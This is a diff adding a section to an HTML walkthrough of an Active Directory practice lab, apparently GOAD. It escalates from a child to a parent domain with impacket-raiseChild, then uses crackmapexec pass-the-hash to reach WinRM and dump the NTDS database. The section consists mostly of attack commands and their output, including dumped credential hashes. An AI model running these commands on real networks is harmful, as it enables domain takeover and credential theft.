@@ -1005,6 +1005,150 @@
 &lt;p&gt;NTLM hashes are just md5 hashes with the fancy name:).&lt;/p&gt;
 &lt;p&gt;And we pwn the NORTH :)&lt;/p&gt;
 &lt;hr&gt;
+&lt;h3 id=&#34;raisemeup&#34;&gt;Raisemeup
+&lt;/h3&gt;&lt;p&gt;We now need to escalate from child domain to parent domain. In this case north.sevenkingdoms.local to sevenkingdoms.local&lt;/p&gt;
+&lt;p&gt;We can use impacket-raisechild&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;impacket-raiseChild north.sevenkingdoms.local/john:&amp;#39;H4x00r123..&amp;#39; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Raising child domain north.sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Forest FQDN is: sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Raising north.sevenkingdoms.local to sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] sevenkingdoms.local Enterprise Admin SID is: S-1-5-21-2593120635-1589445922-2702696661-519
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Getting credentials for north.sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;north.sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e1aa23cbaaed62c05427ff7148c04d8:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;north.sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:3955f047341f1c503f0e4c0319e022508c1493da98e7a8bbb052a74f8fd21872
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Getting credentials for sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:961dd9c581fb10b66d4d141ca6a6efbc:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:50e85a7b53c4b652b469104f764577cb31448ebba755df993fd6424262083a0e
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Target User account name is Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sevenkingdoms.local/Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sevenkingdoms.local/Administrator:aes256-cts-hmac-sha1-96s:bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This will create  a golden ticket for Administrator on the main domain. Then use it to dump secret. So we get the Administrator NTLM hash.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec winrm sevenkingdoms.local -u Administrator -H c66d72021a2d4744409969a581a1705e -d sevenkingdoms.local 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP        kingslanding    5986   sevenkingdoms.local [*] https://kingslanding:5986/wsman
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WINRM       kingslanding    5986   sevenkingdoms.local [+] sevenkingdoms.local\Administrator:c66d72021a2d4744409969a581a1705e (Pwn3d!)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;With this we can dump all secrets, ill use crackmapexec smb.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crackmapexec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sevenkingdoms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;H&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c66d72021a2d4744409969a581a1705e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sevenkingdoms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ntds&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Dumping&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NTDS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;could&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;take&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;so&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;go&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;grab&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redbull&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c66d72021a2d4744409969a581a1705e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Guest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;501&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d6cfe0d16ae931b73c59d7e0c089c0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;krbtgt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;502&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;961&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dd9c581fb10b66d4d141ca6a6efbc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;vagrant&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e02bc503339d51f71d913c245d35b50b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;tywin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lannister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;af52e9ec3471788111a6308abff2e9b7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;jaime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lannister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1113&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;12e3795&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b7dedb3bb741f2e2869616080&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;cersei&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lannister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c247f62516b53893c7addcf8c349954b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;tyron&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lannister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b3b3717f7d51b37fb325f7e7d048e998&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;robert&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;baratheon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9029&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cf007326107eb1c519c84ea60dbe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;joffrey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;baratheon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1117&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b60abbc25770511334b3829866b08f1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;renly&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;baratheon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1118&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1e9&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ed4fc99088768eed631acfcd49bce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;stannis&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;baratheon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1119&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d75b9fdf23c0d9a6549cff9ed6e489cd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;petyer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;baelish&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1120&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c439acfa121a821552568b086c8d210&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;lord&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;varys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;52&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff2a79823d81d6a3f4f8261d7acc59&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SMB&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;kingslanding&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;445&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;KINGSLANDING&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;maester&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pycelle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1122&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a2a96fa3ba6564e755e8d455c007952&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
